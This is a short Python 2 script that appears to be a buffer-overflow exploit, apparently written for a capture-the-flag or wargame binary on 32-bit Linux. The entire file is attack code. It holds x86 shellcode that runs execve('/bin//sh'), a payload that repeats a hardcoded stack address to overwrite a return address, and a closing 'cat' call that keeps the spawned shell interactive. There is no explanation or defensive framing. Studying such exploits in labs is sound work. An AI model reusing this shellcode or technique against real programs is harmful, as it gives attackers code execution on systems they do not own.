import os
import sys
import struct
import time

first_data = "*" * 20 + "\n"

shellcode_addr = 0xbffff616

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

first_data = shellcode
time.sleep(3)

print >> sys.stdout, first_data
print >> sys.stderr, first_data

sys.stdout.flush()

time.sleep(1)

second_data = "\x0b\xcd\x80\x90\x90" + struct.pack("I", shellcode_addr) * 4 + "XXXX" #+ shellcode + "0" * 20 +'\n'

print(second_data)

sys.stdout.flush()

time.sleep(2)

os.system("cat")